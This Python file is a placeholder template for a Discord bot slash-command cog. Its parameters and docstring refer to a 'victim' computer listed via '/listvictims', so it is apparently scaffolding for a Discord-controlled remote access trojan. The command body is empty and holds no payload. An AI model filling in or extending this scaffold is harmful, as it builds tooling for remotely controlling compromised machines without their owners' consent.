import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os
import requests

class CMDNAME(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def CMDNAME(self, ctx, victim, argumentsss):
        """CMD DESCRIPTION

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        argumentsss: ARGUMENT DESCRIPTION
        """

        if self.bot.valid(victim):
            """ command here... """


def setup(bot: commands.Bot):
    bot.add_cog(CMDNAME(bot))
